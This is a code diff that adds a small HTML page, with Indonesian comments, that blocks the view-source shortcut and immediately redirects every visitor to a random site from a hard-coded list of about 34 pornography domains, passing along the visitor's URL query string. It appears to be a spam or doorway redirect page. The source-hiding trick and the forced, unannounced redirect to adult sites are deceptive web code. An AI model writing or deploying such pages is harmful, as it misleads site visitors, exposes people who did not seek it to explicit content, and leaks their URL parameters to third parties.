@@ -1,0 +1,73 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirection...</title>
+    <script>
+        // Fungsi untuk mencegah penggunaan Ctrl + U
+        document.addEventListener('keydown', function (e) {
+            if (e.ctrlKey && (e.key === 'u' || e.key === 'U')) {
+                e.preventDefault();
+                alert("View Source is disabled!");
+            }
+        });
+
+        // Daftar URL tujuan
+        const urls = [
+            "https://porndude.me",
+"https://mofosex.net",
+"https://anyxxx.tv",
+"https://bestpornstars.tv",
+"https://foxporns.net",
+"https://pornzo.net",
+"https://beegsex.tv",
+"https://tubegalo.net",
+"https://hdfreeporn.net",
+"https://gofucker.net",
+"https://redwap.tv",
+"https://pornxo.me",
+"https://beeg.porn",
+"https://tubepornstars.tv",
+"https://hdpornmax.net",
+"https://anyxxx.me",
+"https://fap18.net",
+"https://bestsextube.com",
+"https://hotmovs.net",
+"https://4ksex.me",
+"https://24porn.pro",
+"https://blackporn.me",
+"https://befuck.net",
+"https://fapvid.net",
+"https://pornmate.tv",
+"https://bigporn.cc",
+"https://bigass.me",
+"https://gofucker.com",
+"https://redporn.tv",
+"https://24porn.tv",
+"https://bravotube.tv",
+"https://fap18.biz",
+"https://tubegalore.tv",
+"https://pornhat.tv"
+
+        ];
+
+        // Logika untuk menentukan URL tujuan
+        const currentUrl = new URL(window.location.href);
+        const params = currentUrl.search; // Mendapatkan query string dari URL saat ini
+
+        // Pilih URL berdasarkan logika sederhana (misalnya menggunakan indeks acak)
+        const randomIndex = Math.floor(Math.random() * urls.length);
+        const destinationUrl = urls[randomIndex] + params;
+
+        // Redirect pengguna ke URL tujuan
+        window.location.href = destinationUrl;
+    </script>
+</head>
+<body>
+    <noscript>
+        <p>JavaScript is required for this page. Please enable it to continue.</p>
+    </noscript>
+</body>
+</html>
